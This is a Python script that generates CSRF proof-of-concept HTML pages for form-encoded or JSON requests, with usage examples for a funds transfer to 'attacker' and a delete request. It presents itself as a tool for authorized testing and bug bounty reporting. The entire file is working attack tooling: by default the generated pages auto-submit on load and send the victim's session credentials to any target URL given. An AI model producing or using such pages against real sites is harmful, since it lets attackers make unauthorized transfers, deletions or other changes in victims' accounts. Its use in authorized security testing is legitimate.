#!/usr/bin/env python3
"""
CSRF PoC Generator
-------------------
Generates a self-submitting HTML page that reproduces a state-changing
request (GET or POST, form-encoded or JSON) — the standard way to
demonstrate a CSRF vulnerability to a client or in a bug bounty report.

Intended for use ONLY against systems you own or are explicitly
authorized to test, and only to demonstrate findings responsibly.

Usage:
    # POST form-encoded request
    python csrf_gen.py --url "https://target.com/api/transfer" \\
        --method POST --param amount=1000 --param to_account=attacker \\
        --output poc.html

    # GET request (state-changing GET is itself often a finding)
    python csrf_gen.py --url "https://target.com/api/delete?id=42" \\
        --method GET --output poc.html

    # JSON body
    python csrf_gen.py --url "https://target.com/api/transfer" \\
        --method POST --json '{"amount": 1000, "to": "attacker"}' \\
        --output poc.html
"""

import argparse
import html
import json
import sys
from urllib.parse import urlencode, urlparse, parse_qsl


def build_form_poc(url, method, params, auto_submit):
    parsed = urlparse(url)
    action = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    query_params = dict(parse_qsl(parsed.query))
    all_params = {**query_params, **params}

    inputs = "\n".join(
        f'    <input type="hidden" name="{html.escape(k)}" value="{html.escape(str(v))}" />'
        for k, v in all_params.items()
    )

    submit_script = (
        '  <script>document.forms[0].submit();</script>' if auto_submit else ""
    )
    button = "" if auto_submit else '  <input type="submit" value="Submit request" />\n'

    return f"""<!DOCTYPE html>
<!-- CSRF PoC — for authorized security testing / reporting only -->
<html>
<body>
  <form action="{html.escape(action)}" method="{method.upper()}">
{inputs}
{button}  </form>
{submit_script}
</body>
</html>
"""


def build_json_poc(url, json_body, auto_submit):
    body_js = json.dumps(json_body)
    autorun = "sendCsrfRequest();" if auto_submit else "// call sendCsrfRequest() on a user action, e.g. a button click"
    return f"""<!DOCTYPE html>
<!-- CSRF PoC (JSON body via fetch, credentials included) -->
<!-- Note: this only works if the target does NOT require a custom
     header or CSRF token, and CORS/SameSite policy permits it. -->
<html>
<body>
  <button onclick="sendCsrfRequest()">Trigger request</button>
  <script>
    function sendCsrfRequest() {{
      fetch("{url}", {{
        method: "POST",
        credentials: "include",
        headers: {{ "Content-Type": "application/json" }},
        body: JSON.stringify({body_js})
      }});
    }}
    {autorun}
  </script>
</body>
</html>
"""


def parse_param(param_str):
    if "=" not in param_str:
        print(f"[!] Malformed --param '{param_str}', expected key=value", file=sys.stderr)
        sys.exit(1)
    k, _, v = param_str.partition("=")
    return k, v


def main():
    parser = argparse.ArgumentParser(description="Generate a CSRF proof-of-concept HTML page.")
    parser.add_argument("--url", required=True, help="Target endpoint URL")
    parser.add_argument("--method", default="POST", choices=["GET", "POST"], help="HTTP method (default: POST)")
    parser.add_argument("--param", action="append", default=[], help="key=value form parameter, repeatable")
    parser.add_argument("--json", help='JSON body, e.g. \'{"amount": 1000}\' (uses fetch instead of a form)')
    parser.add_argument("--output", default="poc.html", help="Output HTML file (default: poc.html)")
    parser.add_argument("--no-auto-submit", action="store_true", help="Require a manual click instead of auto-submitting")
    args = parser.parse_args()

    auto_submit = not args.no_auto_submit

    if args.json:
        try:
            json_body = json.loads(args.json)
        except json.JSONDecodeError as e:
            print(f"[!] Invalid --json: {e}", file=sys.stderr)
            sys.exit(1)
        poc = build_json_poc(args.url, json_body, auto_submit)
    else:
        params = dict(parse_param(p) for p in args.param)
        poc = build_form_poc(args.url, args.method, params, auto_submit)

    try:
        with open(args.output, "w", encoding="utf-8") as f:
            f.write(poc)
    except OSError as e:
        print(f"[!] Could not write output file: {e}", file=sys.stderr)
        sys.exit(1)

    print(f"[*] PoC written to {args.output}")
    print("[*] Open it in a browser where you're authenticated to the target to test.")


if __name__ == "__main__":
    main()
